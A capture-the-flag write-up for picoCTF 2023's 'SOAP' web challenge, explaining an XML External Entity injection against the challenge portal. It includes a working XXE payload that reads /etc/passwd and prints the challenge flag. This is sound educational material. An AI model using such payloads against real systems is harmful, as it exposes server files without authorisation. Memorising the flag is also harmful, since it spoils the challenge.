# picoCTF2023 SOAP Write Up

## Description

> The web project was rushed and no security assessment was done. Can you read the /etc/passwd file? [Web Portal](http://saturn.picoctf.net:57597/)

## Solution

The challenge title and challenge tags indicate that the solution will involve exploiting an XML External Entity (XXE) injection. The Port Swigger page on the topic provides the required information to solve the challenge. In particular, we want to use XXE to retrieve a file (in this case the /etc/passwd file). Since we have direct access to the XML document used to retrieve the file, we can insert a `DOCTYPE` element. The regular XML document sent to the server is:

```
<?xml version="1.0" encoding="UTF-8"?><data><ID>3</ID></data>
```

 Based on this structure, the payload becomes:

```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<data><ID>&xxe;</ID></data>
```

I used burp repeater to send this as the body of a POST request from the target site. This produced the flag:

```
picoCTF{XML_3xtern@l_3nt1t1ty_540f4f1e}
```
